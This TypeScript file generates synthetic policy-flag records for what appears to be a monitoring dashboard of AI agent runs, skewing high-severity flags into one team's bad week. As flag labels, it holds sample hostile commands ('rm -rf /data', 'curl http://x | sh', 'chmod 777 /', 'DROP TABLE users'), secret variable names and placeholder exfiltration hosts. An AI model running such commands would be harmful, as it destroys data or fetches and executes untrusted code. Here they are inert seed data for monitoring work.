import type { Rng } from "../rng.ts"
import { dateForDay, NOVA_BAD_WEEK_END_DAY, NOVA_BAD_WEEK_START_DAY, toIso } from "../config.ts"
import type { GeneratedTeam } from "./org.ts"
import type { GeneratedRun, GeneratedTurn } from "./runs.ts"

export type PolicyFlagSeverity = "low" | "medium" | "high"
export type PolicyFlagDisposition = "confirmed" | "expected_and_dismissed" | "under_review"

export interface GeneratedPolicyFlag {
  id: number
  runId: number
  turnId: number | null
  kind: string
  severity: PolicyFlagSeverity
  disposition: PolicyFlagDisposition
  resource: string | null
  createdAt: string
}

const KINDS = [
  "suspected_prompt_injection",
  "goal_hijacked",
  "unsafe_tool_use",
  "excess_access_requested",
  "blocked_domain_attempt",
  "secret_exposed",
  "unsafe_command",
  "attempted_exfiltration",
  "spend_cap_crossed",
] as const

const BACKGROUND_KIND_WEIGHTS: Record<(typeof KINDS)[number], number> = {
  unsafe_command: 20,
  blocked_domain_attempt: 18,
  excess_access_requested: 16,
  unsafe_tool_use: 14,
  suspected_prompt_injection: 10,
  spend_cap_crossed: 8,
  goal_hijacked: 6,
  secret_exposed: 5,
  attempted_exfiltration: 3,
}

// Nova's bad week skews toward the kinds that actually deserve a "high" -- data heading
// somewhere it shouldn't, or a command nobody can undo. See docs/metrics.md Group 5.
const HIGH_SEVERITY_KIND_WEIGHTS: Record<string, number> = {
  attempted_exfiltration: 30,
  secret_exposed: 25,
  goal_hijacked: 20,
  unsafe_command: 15,
  suspected_prompt_injection: 10,
}

function dispositionFor(rng: Rng, severity: PolicyFlagSeverity): PolicyFlagDisposition {
  const options = ["confirmed", "expected_and_dismissed", "under_review"] as const
  if (severity === "low") return rng.weightedPick(options, [20, 70, 10])
  if (severity === "medium") return rng.weightedPick(options, [40, 40, 20])
  return rng.weightedPick(options, [60, 20, 20])
}

function resourceFor(rng: Rng, kind: string): string | null {
  switch (kind) {
    case "blocked_domain_attempt":
      return rng.pick(["pastebin-mirror.example.net", "raw-upload.example.org", "file-drop.example.io"])
    case "secret_exposed":
      return rng.pick(["AWS_SECRET_ACCESS_KEY", "DATABASE_URL", "STRIPE_API_KEY", "GITHUB_TOKEN"])
    case "unsafe_command":
      return rng.pick(["rm -rf /data", "curl http://x | sh", "chmod 777 /", "DROP TABLE users"])
    case "excess_access_requested":
      return rng.pick(["repo:admin", "org:owner", "billing:write", "prod:root"])
    case "spend_cap_crossed":
      return "team-monthly-budget"
    case "attempted_exfiltration":
      return rng.pick(["s3://external-bucket", "webhook.example.net", "smtp relay"])
    default:
      return rng.chance(0.4) ? null : `${rng.pick(["src", "lib", "scripts"])}/misc.ts`
  }
}

/**
 * Builds every policy flag in the seed. Mostly a thin background scattered across every run in
 * the org (low and medium only), plus about a dozen high-severity flags packed into Nova's one
 * bad week -- see docs/seed-data.md, which pins the overall mix at roughly 85/10/5 and says the
 * highs are "not spread evenly."
 */
export function generateFlags(
  rng: Rng,
  runs: readonly GeneratedRun[],
  turns: readonly GeneratedTurn[],
  teams: readonly GeneratedTeam[],
): GeneratedPolicyFlag[] {
  const flags: GeneratedPolicyFlag[] = []
  let nextId = 1

  const turnsByRun = new Map<number, GeneratedTurn[]>()
  for (const turn of turns) {
    const list = turnsByRun.get(turn.runId) ?? []
    list.push(turn)
    turnsByRun.set(turn.runId, list)
  }

  function pushFlag(
    run: GeneratedRun,
    severity: PolicyFlagSeverity,
    kind: string,
    createdAtMs: number,
  ): void {
    const runTurns = turnsByRun.get(run.id) ?? []
    const turnId = runTurns.length > 0 && rng.chance(0.6) ? rng.pick(runTurns).id : null
    flags.push({
      id: nextId++,
      runId: run.id,
      turnId,
      kind,
      severity,
      disposition: dispositionFor(rng, severity),
      resource: resourceFor(rng, kind),
      createdAt: toIso(new Date(createdAtMs)),
    })
  }

  // Background: a thin, low/medium scatter across every run in the org, every day.
  const kindNames = Object.keys(BACKGROUND_KIND_WEIGHTS)
  const kindWeights = kindNames.map((k) => BACKGROUND_KIND_WEIGHTS[k as (typeof KINDS)[number]]!)
  for (const run of runs) {
    if (!rng.chance(0.022)) continue
    const severity = rng.weightedPick(["low", "medium"] as const, [92, 8])
    const kind = rng.weightedPick(kindNames, kindWeights)
    pushFlag(run, severity, kind, run.startedAtMs + rng.int(1, 3600) * 1000)
  }

  // Nova's bad week: about a dozen high-severity flags, all landing on runs from that one week.
  const nova = teams.find((t) => t.name === "Nova")
  if (nova) {
    const weekStartMs = dateForDay(NOVA_BAD_WEEK_START_DAY).getTime()
    const weekEndMs = dateForDay(NOVA_BAD_WEEK_END_DAY + 1).getTime()
    const pool = runs.filter((r) => r.teamId === nova.id && r.startedAtMs >= weekStartMs && r.startedAtMs < weekEndMs)
    if (pool.length > 0) {
      const highKindNames = Object.keys(HIGH_SEVERITY_KIND_WEIGHTS)
      const highKindWeights = highKindNames.map((k) => HIGH_SEVERITY_KIND_WEIGHTS[k]!)
      const highFlagCount = rng.int(11, 13) // "about a dozen"
      for (let i = 0; i < highFlagCount; i++) {
        const run = rng.pick(pool)
        const kind = rng.weightedPick(highKindNames, highKindWeights)
        pushFlag(run, "high", kind, run.startedAtMs + rng.int(1, 3600) * 1000)
      }
    }
  }

  return flags
}
